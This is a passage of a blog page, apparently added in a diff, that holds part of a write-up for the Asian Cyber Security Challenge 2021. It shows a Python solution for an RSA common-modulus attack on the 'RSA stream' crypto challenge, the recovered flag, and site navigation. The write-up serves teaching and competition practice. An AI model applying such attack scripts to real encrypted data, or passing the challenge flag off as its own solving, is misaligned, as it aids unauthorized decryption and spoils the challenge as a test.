class="built_in">len</span>(cipher), <span class="number">256</span>):</span><br><span class="line">    c = bytes_to_long(cipher[i:i + <span class="number">256</span>])</span><br><span class="line"></span><br><span class="line">    q = f[i:i + <span class="number">256</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(q) &lt; <span class="number">256</span>:</span><br><span class="line">        q = pad(q, <span class="number">256</span>)</span><br><span class="line"></span><br><span class="line">    q = bytes_to_long(q)</span><br><span class="line">    stream.append(c ^ q)</span><br><span class="line"></span><br><span class="line">n = <span class="number">0xedad9a316b218bb93169944b8f1995adfb40653cb89aee0eeb95166a85125fcf403a834bfda896f56bfd553ce6ea48b1480434bb324dd0ffabdfd0f26365261c056295c1064b688b3dd91c469b8d902070b6c68f48935690f6c126beb6c9917d24f02aab1558355e4e3ac9e1cbf1ae74469370d3f87303784e8b23bd11c7826d4a3e8a4247b2dac71153762d578af909b2f38182e89e82836f4b80f807b6b0823524219d0f1e885f2cd4f42849eafb1cd6344cd806ec8216892f209209ed4eb5d13b03354cf0c57aff4aa166a47f1a361a405dfbad3535fbbe046ce8259c4f3c3c9d20aeb7a5a82078089cece53abe04fae95414cde0419175f926ec2309668d</span></span><br><span class="line">e = [<span class="number">65537</span>, <span class="number">65539</span>, <span class="number">65543</span>]</span><br><span class="line"></span><br><span class="line">x, y = egcd(e[<span class="number">0</span>], e[<span class="number">1</span>])</span><br><span class="line">m = long_to_bytes(<span class="built_in">pow</span>(stream[<span class="number">0</span>], x, n) * <span class="built_in">pow</span>(stream[<span class="number">1</span>], y, n) % n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(m)</span><br></pre></td></tr></table></figure>
+
+<p>Flag: <code>ACSC&#123;changing_e_is_too_bad_idea_1119332842ed9c60c9917165c57dbd7072b016d5b683b67aba6a648456db189c&#125;</code></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#filtered-pwn-100"><span class="toc-number">1.</span> <span class="toc-text">filtered (pwn-100)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Summary"><span class="toc-number">1.1.</span> <span class="toc-text">Summary</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Solution"><span class="toc-number">1.2.</span> <span class="toc-text">Solution</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RSA-stream-crypto-100"><span class="toc-number">2.</span> <span class="toc-text">RSA stream (crypto-100)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Summary-1"><span class="toc-number">2.1.</span> <span class="toc-text">Summary</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Solution-1"><span class="toc-number">2.2.</span> <span class="toc-text">Solution</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Getting-our-RSA-back"><span class="toc-number">2.2.1.</span> <span class="toc-text">Getting our RSA back</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cracking-RSA"><span class="toc-number">2.2.2.</span> <span class="toc-text">Cracking RSA</span></a></li></ol></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://woanmeo11.github.io/2021/09/19/Asian-Cyber-Security-Challenge-2021/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://woanmeo11.github.io/2021/09/19/Asian-Cyber-Security-Challenge-2021/&text=Asian Cyber Security Challenge 2021"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://woanmeo11.github.io/2021/09/19/Asian-Cyber-Security-Challenge-2021/&title=Asian Cyber Security Challenge 2021"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://woanmeo11.github.io/2021/09/19/Asian-Cyber-Security-Challenge-2021/&is_video=false&description=Asian Cyber Security Challenge 2021"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Asian Cyber Security Challenge 2021&body=Check out this article: https://woanmeo11.github.io/2021/09/19/Asian-Cyber-Security-Challenge-2021/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://woanmeo11.github.io/2021/09/19/Asian-Cyber-Security-Challenge-2021/&title=Asian Cyber Security Challenge 2021"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://woanmeo11.github.io/2021/09/19/Asian-Cyber-Security-Challenge-2021/&title=Asian Cyber Security Challenge 2021"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://woanmeo11.github.io/2021/09/19/Asian-Cyber-Security-Challenge-2021/&title=Asian Cyber Security Challenge 2021"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://woanmeo11.github.io/2021/09/19/Asian-Cyber-Security-Challenge-2021/&title=Asian Cyber Security Challenge 2021"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://woanmeo11.github.io/2021/09/19/Asian-Cyber-Security-Challenge-2021/&name=Asian Cyber Security Challenge 2021&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://woanmeo11.github.io/2021/09/19/Asian-Cyber-Security-Challenge-2021/&t=Asian Cyber Security Challenge 2021"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2022
+    Wのﾑ刀ﾶ乇の11
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
